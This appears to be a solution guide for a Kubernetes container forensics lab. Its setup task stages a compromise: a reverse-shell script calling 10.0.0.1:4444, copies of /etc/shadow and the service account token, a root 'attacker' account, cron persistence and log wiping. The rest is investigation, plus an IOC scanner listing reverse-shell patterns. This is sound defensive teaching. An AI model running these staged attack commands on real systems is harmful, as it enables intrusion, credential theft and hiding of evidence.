# Lab 5.4 — Container Forensics & Evidence Collection Solution Guide
**Phase**: 5 — Expert

---

## Task 1: Crime Scene Setup

```bash
# Deploy the compromised container
kubectl create namespace forensics-lab

kubectl run compromised-app -n forensics-lab \
  --image=ubuntu:22.04 --restart=Never -- bash -c '
  apt-get update -qq > /dev/null 2>&1
  apt-get install -y -qq curl netcat-openbsd procps > /dev/null 2>&1
  echo "#!/bin/bash" > /tmp/.hidden-backdoor.sh
  echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> /tmp/.hidden-backdoor.sh
  chmod +x /tmp/.hidden-backdoor.sh
  cat /etc/shadow > /tmp/stolen-shadow
  cp /var/run/secrets/kubernetes.io/serviceaccount/token /tmp/stolen-token 2>/dev/null || true
  echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd
  echo "* * * * * /tmp/.hidden-backdoor.sh" > /var/spool/cron/crontabs/root 2>/dev/null || true
  history -c
  > /var/log/auth.log 2>/dev/null || true
  sleep 86400
'

# Wait for it to be running
kubectl wait --for=condition=Ready pod/compromised-app -n forensics-lab --timeout=120s
echo "✅ Crime scene ready for investigation"
```

---

## Task 2: Live Container Forensics

### 2.1 Process Forensics

```bash
# Full process tree
kubectl exec compromised-app -n forensics-lab -- ps auxwwf

# Process tree with parent PIDs
kubectl exec compromised-app -n forensics-lab -- ps -ejH

# All open files per process
kubectl exec compromised-app -n forensics-lab -- bash -c '
for pid in $(ls /proc/ | grep -E "^[0-9]+$" | head -50); do
    echo "=== PID $pid: $(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " ") ==="
    ls -la /proc/$pid/fd/ 2>/dev/null | head -20
    echo ""
done
'

# Find processes with network connections
kubectl exec compromised-app -n forensics-lab -- bash -c '
echo "=== Processes with open sockets ==="
for pid in $(ls /proc/ | grep -E "^[0-9]+$"); do
    sockets=$(ls /proc/$pid/fd/ 2>/dev/null | while read fd; do
        readlink /proc/$pid/fd/$fd 2>/dev/null | grep -c socket
    done | paste -sd+ | bc 2>/dev/null)
    if [ "$sockets" -gt 0 ] 2>/dev/null; then
        echo "PID $pid ($(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " ")): $sockets sockets"
    fi
done
'

# Environment variables (may contain stolen secrets)
kubectl exec compromised-app -n forensics-lab -- env | sort
```

### 2.2 Filesystem Forensics

```bash
# Find recently modified files (last 24 hours)
kubectl exec compromised-app -n forensics-lab -- \
  find / -mtime -1 -not -path '/proc/*' -not -path '/sys/*' \
  -not -path '/dev/*' -type f -ls 2>/dev/null

# Find hidden files (starting with .)
kubectl exec compromised-app -n forensics-lab -- \
  find / -name ".*" -not -path '/proc/*' -not -path '/sys/*' \
  -type f -ls 2>/dev/null

# Find executable files in temp directories
kubectl exec compromised-app -n forensics-lab -- \
  find /tmp /var/tmp /dev/shm -type f -executable -ls 2>/dev/null

# Find files with SUID bit set (privilege escalation tools)
kubectl exec compromised-app -n forensics-lab -- \
  find / -perm -4000 -type f -ls 2>/dev/null

# Find recently created user accounts
kubectl exec compromised-app -n forensics-lab -- \
  cat /etc/passwd | grep -v "nologin\|false" | grep ":/bin/bash\|:/bin/sh"

# Check for modified system files
kubectl exec compromised-app -n forensics-lab -- bash -c '
echo "=== /etc/passwd modifications ==="
grep -n "attacker\|x:0:0" /etc/passwd
echo ""
echo "=== Cron jobs ==="
cat /var/spool/cron/crontabs/* 2>/dev/null || echo "No user crontabs"
cat /etc/crontab 2>/dev/null
echo ""
echo "=== SSH authorized keys ==="
find / -name "authorized_keys" -ls 2>/dev/null
'

# Find files the attacker tried to hide
kubectl exec compromised-app -n forensics-lab -- bash -c '
echo "=== Suspicious files in /tmp ==="
ls -laR /tmp/ 2>/dev/null
echo ""
echo "=== Files with timestamps in the attack window ==="
find / -newer /tmp/.hidden-backdoor.sh -not -path "/proc/*" -not -path "/sys/*" \
  -type f -ls 2>/dev/null | head -30
'
```

### 2.3 Network Forensics

```bash
# Current TCP connections
kubectl exec compromised-app -n forensics-lab -- cat /proc/net/tcp

# Decoded TCP connections
kubectl exec compromised-app -n forensics-lab -- bash -c '
echo "Proto | Local Address | Remote Address | State"
echo "------|---------------|----------------|------"
cat /proc/net/tcp | tail -n +2 | while read line; do
    local_hex=$(echo $line | awk "{print \$2}")
    remote_hex=$(echo $line | awk "{print \$3}")
    state_hex=$(echo $line | awk "{print \$4}")
    
    # Decode IP:port
    local_ip=$(printf "%d.%d.%d.%d" \
        0x${local_hex:6:2} 0x${local_hex:4:2} 0x${local_hex:2:2} 0x${local_hex:0:2})
    local_port=$((16#${local_hex:9:4}))
    remote_ip=$(printf "%d.%d.%d.%d" \
        0x${remote_hex:6:2} 0x${remote_hex:4:2} 0x${remote_hex:2:2} 0x${remote_hex:0:2})
    remote_port=$((16#${remote_hex:9:4}))
    
    # Decode state
    case $state_hex in
        01) state="ESTABLISHED" ;;
        02) state="SYN_SENT" ;;
        06) state="TIME_WAIT" ;;
        0A) state="LISTEN" ;;
        *) state="$state_hex" ;;
    esac
    
    echo "TCP  | $local_ip:$local_port | $remote_ip:$remote_port | $state"
done
'

# DNS resolution history (from /etc/hosts modifications)
kubectl exec compromised-app -n forensics-lab -- cat /etc/hosts

# Listening ports (potential backdoors)
kubectl exec compromised-app -n forensics-lab -- bash -c '
cat /proc/net/tcp | awk "\$4==\"0A\" {print \$2}" | while read hex; do
    port=$((16#${hex:9:4}))
    echo "LISTENING on port: $port"
done
'
```

### 2.4 Memory Forensics

```bash
# Examine process command lines
kubectl exec compromised-app -n forensics-lab -- bash -c '
for pid in $(ls /proc/ | grep -E "^[0-9]+$"); do
    cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " ")
    if [ -n "$cmdline" ]; then
        echo "PID $pid: $cmdline"
    fi
done
'

# Search process memory for interesting strings
kubectl exec compromised-app -n forensics-lab -- bash -c '
for pid in $(ls /proc/ | grep -E "^[0-9]+$" | head -20); do
    cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " ")
    # Search for suspicious strings in process memory maps
    strings /proc/$pid/environ 2>/dev/null | grep -iE "password|secret|key|token|aws" | head -5
done
'

# Process maps (loaded libraries — check for injected libraries)
kubectl exec compromised-app -n forensics-lab -- bash -c '
for pid in $(ls /proc/ | grep -E "^[0-9]+$" | head -10); do
    echo "=== PID $pid: $(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " ") ==="
    cat /proc/$pid/maps 2>/dev/null | grep -v "libc\|ld-linux\|libpthread" | head -10
    echo ""
done
'
```

---

## Task 3: Container Image Diff

```bash
#!/bin/bash
# container-diff.sh — Compare running container filesystem to original image
# Usage: ./container-diff.sh <container-id-or-name> <image-name>

CONTAINER="${1:?Usage: $0 <container-id> <image-name>}"
IMAGE="${2:?Usage: $0 <container-id> <image-name>}"
WORK_DIR=$(mktemp -d)
REPORT_FILE="container-diff-report-$(date +%Y%m%d%H%M%S).md"

echo "🔍 Comparing container '${CONTAINER}' against image '${IMAGE}'"
echo "📁 Working directory: ${WORK_DIR}"

# Export container filesystem
echo "  → Exporting container filesystem..."
docker export "${CONTAINER}" > "${WORK_DIR}/container-fs.tar"

# Export image filesystem (create temp container, export, remove)
echo "  → Exporting image filesystem..."
TEMP_CONTAINER=$(docker create "${IMAGE}" /bin/true)
docker export "${TEMP_CONTAINER}" > "${WORK_DIR}/image-fs.tar"
docker rm "${TEMP_CONTAINER}" > /dev/null

# Extract both
echo "  → Extracting filesystems..."
mkdir -p "${WORK_DIR}/container" "${WORK_DIR}/image"
tar xf "${WORK_DIR}/container-fs.tar" -C "${WORK_DIR}/container" 2>/dev/null
tar xf "${WORK_DIR}/image-fs.tar" -C "${WORK_DIR}/image" 2>/dev/null

# Generate file listings with hashes
echo "  → Generating file hashes..."
(cd "${WORK_DIR}/container" && find . -type f -exec sha256sum {} \; | sort) > "${WORK_DIR}/container-hashes.txt"
(cd "${WORK_DIR}/image" && find . -type f -exec sha256sum {} \; | sort) > "${WORK_DIR}/image-hashes.txt"

# Compare
echo "  → Analyzing differences..."

# Added files (in container but not in image)
comm -23 \
    <(awk '{print $2}' "${WORK_DIR}/container-hashes.txt" | sort) \
    <(awk '{print $2}' "${WORK_DIR}/image-hashes.txt" | sort) \
    > "${WORK_DIR}/added-files.txt"

# Deleted files (in image but not in container)
comm -13 \
    <(awk '{print $2}' "${WORK_DIR}/container-hashes.txt" | sort) \
    <(awk '{print $2}' "${WORK_DIR}/image-hashes.txt" | sort) \
    > "${WORK_DIR}/deleted-files.txt"

# Modified files (same path, different hash)
join -j 2 \
    <(sort -k2 "${WORK_DIR}/container-hashes.txt") \
    <(sort -k2 "${WORK_DIR}/image-hashes.txt") \
    | awk '$1 != $2 {print $3}' \
    > "${WORK_DIR}/modified-files.txt" 2>/dev/null

# Generate report
cat > "${REPORT_FILE}" << EOF
# Container Forensic Diff Report

**Date**: $(date -u +%Y-%m-%dT%H:%M:%SZ)
**Container**: ${CONTAINER}
**Image**: ${IMAGE}
**Investigator**: $(whoami)

## Summary

| Category | Count |
|---|---|
| Added files | $(wc -l < "${WORK_DIR}/added-files.txt") |
| Modified files | $(wc -l < "${WORK_DIR}/modified-files.txt") |
| Deleted files | $(wc -l < "${WORK_DIR}/deleted-files.txt") |

## 🔴 Added Files (Attacker Artifacts)

These files exist in the running container but NOT in the original image:

\`\`\`
$(cat "${WORK_DIR}/added-files.txt")
\`\`\`

### Suspicious Added Files Analysis:
$(while read f; do
    full_path="${WORK_DIR}/container/${f#./}"
    if [ -f "$full_path" ]; then
        file_type=$(file -b "$full_path" 2>/dev/null || echo "unknown")
        file_size=$(stat -c%s "$full_path" 2>/dev/null || stat -f%z "$full_path" 2>/dev/null || echo "?")
        echo "- \`${f}\` — ${file_type} (${file_size} bytes)"
        # Show content of small text files
        if [ "$file_size" -lt 1000 ] 2>/dev/null && echo "$file_type" | grep -qi "text\|script\|ascii"; then
            echo '  ```'
            cat "$full_path" | head -10
            echo '  ```'
        fi
    fi
done < "${WORK_DIR}/added-files.txt")

## 🟡 Modified Files (Tampered)

These files exist in both but have different content:

\`\`\`
$(cat "${WORK_DIR}/modified-files.txt")
\`\`\`

## 🟠 Deleted Files (Anti-Forensics)

These files were in the original image but removed by the attacker:

\`\`\`
$(cat "${WORK_DIR}/deleted-files.txt" | head -50)
\`\`\`

EOF

echo ""
echo "═══════════════════════════════════════"
echo "✅ Forensic diff complete"
echo "📄 Report: ${REPORT_FILE}"
echo "📊 Added: $(wc -l < "${WORK_DIR}/added-files.txt") | Modified: $(wc -l < "${WORK_DIR}/modified-files.txt") | Deleted: $(wc -l < "${WORK_DIR}/deleted-files.txt")"
echo "═══════════════════════════════════════"

# Cleanup
rm -rf "${WORK_DIR}"
```

---

## Task 4: Post-Deletion Recovery

```bash
# ═══ Evidence sources AFTER pod deletion ═══

# 1. Container runtime — recently stopped containers
# On the Kubernetes node (ssh to node or use debug pod):
crictl ps -a | grep compromised-app
# The container may still exist in "Exited" state

# Get container ID and inspect
CONTAINER_ID=$(crictl ps -a | grep compromised-app | awk '{print $1}')
crictl inspect "$CONTAINER_ID"  # Full container metadata
crictl logs "$CONTAINER_ID"      # Container logs (preserved!)

# 2. Container storage layers
# For containerd:
# Layers are at: /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/
# For Docker:
# Layers are at: /var/lib/docker/overlay2/

# Find the container's writable layer
LAYER_ID=$(crictl inspect "$CONTAINER_ID" | jq -r '.info.snapshotKey')
# Browse the attacker's modifications in the overlay layer

# 3. Kubernetes Audit Logs
# If audit logging is enabled (kube-apiserver --audit-policy-file):
kubectl logs -n kube-system kube-apiserver-* | \
  jq 'select(.objectRef.name == "compromised-app")'

# Key audit events to look for:
# - pods.create — who deployed the compromised pod?
# - pods.exec — who exec'd into it?
# - secrets.get — did the pod access secrets via the API?

# 4. Falco logs (the best source — Falco saw EVERYTHING)
kubectl logs -l app.kubernetes.io/name=falco -n falco --since=48h | \
  grep "compromised-app"

# 5. Node-level evidence
# Kubelet logs:
journalctl -u kubelet --since "2024-06-14" | grep "compromised-app"

# Kernel audit logs (if auditd is running):
ausearch -k exec --start "06/14/2024" | grep -i "compromised"

# 6. Network flow logs
# If Calico or Cilium network plugin with flow logging:
# Query for the pod's IP during the attack window
POD_IP="10.244.0.15"  # Get from audit logs or Falco
# Search flow logs for this IP
```

---

## Task 5: Forensic Toolkit

```dockerfile
# forensic-toolkit/Dockerfile
FROM ubuntu:22.04

RUN apt-get update && apt-get install -y --no-install-recommends \
    # ── Process Analysis ──
    procps \
    psmisc \
    strace \
    ltrace \
    lsof \
    # ── Network Analysis ──
    tcpdump \
    nmap \
    netcat-openbsd \
    net-tools \
    iproute2 \
    dnsutils \
    curl \
    wget \
    # ── Filesystem Analysis ──
    findutils \
    file \
    binutils \
    tree \
    # ── Text/Binary Analysis ──
    binwalk \
    # ── Hash & Integrity ──
    coreutils \
    # ── Compression ──
    tar \
    gzip \
    bzip2 \
    xz-utils \
    # ── Scripting ──
    python3 \
    python3-pip \
    jq \
    # ── Container Tools ──
    skopeo \
    && pip3 install yara-python \
    && rm -rf /var/lib/apt/lists/*

# Copy forensic scripts
COPY scripts/ /forensics/scripts/
RUN chmod +x /forensics/scripts/*.sh

# IOC signatures
COPY ioc-signatures/ /forensics/ioc-signatures/

WORKDIR /forensics
ENTRYPOINT ["/bin/bash"]
```

```bash
# forensic-toolkit/scripts/ioc-scanner.sh
#!/bin/bash
# Scan a filesystem for Indicators of Compromise

TARGET="${1:-.}"

echo "🔍 IOC Scanner — Scanning: ${TARGET}"
echo "═══════════════════════════════════════"

FINDINGS=0

# ── Known malicious filenames ──
echo ""
echo "▸ Scanning for known malicious filenames..."
MALICIOUS_NAMES=(
    "xmrig" "ccminer" "minergate" "minerd" "cpuminer"
    "linpeas" "winpeas" "pspy" "chisel" "socat"
    "reverse_shell" "backdoor" "webshell" "c99" "r57"
    ".hidden" "..data" "...space"
)

for name in "${MALICIOUS_NAMES[@]}"; do
    FOUND=$(find "$TARGET" -iname "*${name}*" -type f 2>/dev/null)
    if [ -n "$FOUND" ]; then
        echo "  🚨 FOUND: $FOUND"
        FINDINGS=$((FINDINGS + 1))
    fi
done

# ── Suspicious file permissions ──
echo ""
echo "▸ Scanning for suspicious permissions..."
# SUID files in unusual locations
find "$TARGET" -perm -4000 -not -path "*/usr/bin/*" -not -path "*/usr/sbin/*" \
    -not -path "*/bin/*" -not -path "*/sbin/*" -type f 2>/dev/null | while read f; do
    echo "  🚨 SUID in unusual location: $f"
    FINDINGS=$((FINDINGS + 1))
done

# World-writable executables
find "$TARGET" -perm -0002 -executable -type f 2>/dev/null | while read f; do
    echo "  ⚠️  World-writable executable: $f"
done

# ── Suspicious content in files ──
echo ""
echo "▸ Scanning file contents for IOCs..."
grep -rl --include="*.sh" --include="*.py" --include="*.php" --include="*.pl" \
    -E "(\/dev\/tcp|bash -i|nc -e|ncat|reverse|shell|base64.*decode)" \
    "$TARGET" 2>/dev/null | while read f; do
    echo "  🚨 Reverse shell / encoded payload in: $f"
    FINDINGS=$((FINDINGS + 1))
done

# ── Modified system files ──
echo ""
echo "▸ Checking system file integrity..."
# Users with UID 0 (should only be root)
if [ -f "$TARGET/etc/passwd" ]; then
    ROOT_USERS=$(awk -F: '$3 == 0 && $1 != "root"' "$TARGET/etc/passwd" 2>/dev/null)
    if [ -n "$ROOT_USERS" ]; then
        echo "  🚨 Non-root user with UID 0: $ROOT_USERS"
        FINDINGS=$((FINDINGS + 1))
    fi
fi

# ── Cron persistence ──
echo ""
echo "▸ Checking for cron persistence..."
find "$TARGET" -path "*/cron*" -type f 2>/dev/null | while read f; do
    echo "  📋 Cron file: $f"
    cat "$f" 2>/dev/null | grep -v "^#" | grep -v "^$" | while read line; do
        echo "    → $line"
    done
done

# ── Summary ──
echo ""
echo "═══════════════════════════════════════"
echo "📊 Scan complete: ${FINDINGS} indicators of compromise found"
if [ "$FINDINGS" -gt 0 ]; then
    echo "🚨 ACTION REQUIRED: Investigate findings above"
    exit 1
fi
echo "✅ No obvious IOCs detected (manual review still recommended)"
```

---

## Task 6: Timeline Reconstruction

```bash
#!/bin/bash
# forensic-toolkit/scripts/timeline.sh
# Build a forensic timeline from container evidence

EVIDENCE_DIR="${1:?Usage: $0 <evidence-directory>}"
TIMELINE_FILE="forensic-timeline-$(date +%Y%m%d).md"

echo "# Forensic Timeline" > "$TIMELINE_FILE"
echo "" >> "$TIMELINE_FILE"
echo "| Timestamp | Source | Action | Details |" >> "$TIMELINE_FILE"
echo "|---|---|---|---|" >> "$TIMELINE_FILE"

# Parse filesystem timestamps
echo "▸ Analyzing filesystem timestamps..."
if [ -d "$EVIDENCE_DIR/container-fs" ]; then
    find "$EVIDENCE_DIR/container-fs" -type f -printf '%T+ %p\n' 2>/dev/null | \
    sort | while read timestamp filepath; do
        # Only show files modified recently (within attack window)
        echo "| ${timestamp%.*} | filesystem | File modified | \`${filepath}\` |" >> "$TIMELINE_FILE"
    done
fi

# Parse Falco alerts
echo "▸ Analyzing Falco alerts..."
if [ -f "$EVIDENCE_DIR/falco-alerts.json" ]; then
    jq -r '.[] | "| \(.time) | falco | \(.rule) | \(.output) |"' \
        "$EVIDENCE_DIR/falco-alerts.json" >> "$TIMELINE_FILE" 2>/dev/null
fi

# Parse K8s audit log
echo "▸ Analyzing Kubernetes audit log..."
if [ -f "$EVIDENCE_DIR/k8s-audit.json" ]; then
    jq -r 'select(.verb != "get" and .verb != "list" and .verb != "watch") |
        "| \(.requestReceivedTimestamp) | k8s-audit | \(.verb) \(.objectRef.resource) | \(.objectRef.name) by \(.user.username) |"' \
        "$EVIDENCE_DIR/k8s-audit.json" >> "$TIMELINE_FILE" 2>/dev/null
fi

# Sort by timestamp
sort -t'|' -k2 "$TIMELINE_FILE" > "${TIMELINE_FILE}.sorted"
head -3 "$TIMELINE_FILE" > "${TIMELINE_FILE}.final"
tail -n +4 "${TIMELINE_FILE}.sorted" >> "${TIMELINE_FILE}.final"
mv "${TIMELINE_FILE}.final" "$TIMELINE_FILE"

echo "✅ Timeline generated: ${TIMELINE_FILE}"
echo "📊 Total events: $(wc -l < "$TIMELINE_FILE")"
```

---

## ✅ Answers to Reflection Questions

### 1. What's Lost When a Pod Is Deleted?

**Permanently lost**:
- Running process state (PIDs, memory, open files, network connections)
- Container's writable filesystem layer (may persist briefly in runtime storage)
- In-container environment variables at time of compromise
- Real-time network connections (established sessions)

**Still recoverable**:
- Container logs (kubelet preserves terminated container logs)
- Kubernetes audit logs (who created/exec'd/deleted the pod)
- Falco alerts (captured independently at kernel level)
- Node-level logs (kubelet, kernel, auditd)
- Network flow logs (VPC/CNI flow logs)
- Container image (unchanged — can analyze what vulnerabilities were present)

### 2. Chain of Custody & SHA-256

Chain of custody documents WHO had the evidence, WHEN, and proves it WASN'T MODIFIED.

SHA-256 hashes maintain chain of custody by:
1. **At collection**: Hash every evidence file → record in manifest
2. **At transfer**: Verify hashes match → proves nothing changed during transfer
3. **At analysis**: Verify hashes again → proves nothing changed during storage
4. **In court/audit**: Hash chain proves evidence integrity from collection to presentation

If a single bit changes (accidental or malicious), the SHA-256 hash is completely different.

### 3. Volatile vs Persistent Evidence

| Volatile (Gone When Container Stops) | Persistent (Survives Deletion) |
|---|---|
| Running processes, PIDs | Container logs (kubelet) |
| Network connections (TCP state) | Kubernetes audit logs |
| Process memory contents | Falco/eBPF alerts |
| Open file descriptors | Network flow logs |
| /proc filesystem | Container image (in registry) |
| Container writable layer (ephemeral) | Node-level system logs |
| Environment variables | VPC/cloud audit logs |

**Collect volatile evidence FIRST** — you can always get persistent evidence later.

### 4. When Attacker Clears History and Logs

Even with history cleared and logs wiped, these still reveal activity:

1. **Falco/eBPF**: Captures at kernel level — attacker can't disable without host access
2. **Filesystem timestamps**: `find -newer` shows files created/modified during attack window
3. **Container diff**: Compare to original image — can't undo apt-get installs, created files
4. **Process memory**: `/proc/$PID/cmdline` shows current commands, not bash history
5. **Network connections**: `/proc/net/tcp` shows active connections regardless of logs
6. **Kubernetes audit**: API server logs every exec, even if container logs are wiped
7. **Node kernel logs**: `dmesg`, `auditd` capture syscalls at the host level

### 5. Service Account Token Blast Radius

To determine what the attacker accessed with the stolen token:

1. **Check token permissions**: `kubectl auth can-i --list --as=system:serviceaccount:$NS:$SA`
2. **Query K8s audit logs**: Filter for the SA's identity — every API call is logged
3. **Check secrets the SA can access**: If the SA has `get secrets` permission, ALL secrets in that namespace may be compromised
4. **Check other services**: If the SA has permissions in other namespaces, those are in scope too
5. **Rotate immediately**: Create a new SA, delete the old one (invalidates the stolen token)
6. **Rotate all accessible secrets**: Any secret the SA could read must be treated as compromised

Blast radius = every resource the SA had RBAC permission to access, in every namespace it had permissions in.

